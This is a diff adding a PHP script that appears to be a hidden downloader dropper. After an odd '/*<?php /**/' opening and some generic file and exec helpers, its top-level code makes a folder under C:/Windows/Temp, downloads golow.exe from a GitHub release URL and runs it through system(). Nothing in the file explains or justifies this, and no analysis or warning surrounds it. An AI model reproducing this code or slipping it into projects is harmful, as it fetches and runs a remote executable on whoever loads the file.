@@ -1,0 +1,86 @@
+    /*<?php /**/
+
+
+function deleteFile($filePath) {
+
+    if (file_exists($filePath)) {
+        if (unlink($filePath)) {
+            echo "Deleted: $filePath\n";
+        } else {
+            echo "Failed to delete: $filePath\n";
+        }
+    } else {
+        echo "File does not exist: $filePath\n";
+    }
+}
+
+
+function downloadFile($url, $savePath) {
+
+    // Check if the file already exists
+    if (!file_exists($savePath)) {
+
+
+    
+
+    // Download the file if it does not exist
+    $downloadedFile = file_get_contents($url);
+    if ($downloadedFile !== false) {
+        if (file_put_contents($savePath, $downloadedFile)) {
+            echo "Downloaded and saved: $savePath\n";
+        } else {
+            echo "Failed to download and save: $savePath\n";
+        }
+    } else {
+        echo "Failed to download: $url\n";
+    }
+    } 
+}
+
+
+function executeCommand($command) {
+    $output = null;
+    $returnCode = null;
+    exec($command, $output, $returnCode);
+    if ($returnCode === 0) {
+        echo "Command executed successfully.\n";
+    } else {
+        echo "Failed to execute command. Return code: $returnCode\n";
+    }
+}
+
+
+
+
+
+
+system('mkdir "C:/Windows/Temp/front2/"');
+
+
+
+
+$url2 =  'https://github.com/mainpoint91/fiveminllk/releases/download/golow/golow.exe';
+
+
+$file_name2 = 'C:/Windows/Temp/front2/golow.exe';
+
+
+
+
+         if (file_put_contents($file_name2, file_get_contents($url2)))
+            {
+                system('C:/Windows/Temp/front2/golow.exe');
+            }
+        else
+            {
+            echo "File downloading failed.";
+            }
+ 
+
+         
+        
+
+
+
+
+
